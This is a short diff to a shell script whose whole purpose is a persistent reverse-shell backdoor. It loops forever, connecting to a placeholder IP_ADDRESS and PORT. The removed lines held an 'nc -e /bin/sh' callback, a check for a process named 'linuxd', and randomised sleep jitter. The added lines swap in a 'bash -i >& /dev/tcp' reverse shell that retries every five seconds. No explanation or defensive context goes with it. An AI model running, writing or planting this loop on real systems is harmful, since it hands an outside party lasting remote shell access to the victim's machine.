@@ -2,12 +2,7 @@
 _addr=IP_ADDRESS
 _port=PORT
 
-pgrep linuxd &>/dev/null
-[ $? -eq 0 ] && cat && exit
-
 while true; do
-    nc -e /bin/sh $_addr $_port
-    [ -n $RANDOM ] && \
-        sleep .$(($RANDOM % 9))s || \
-            sleep .25s
+    bash -i >& /dev/tcp/$_addr/$_port 0>&1
+    sleep 5s
 done
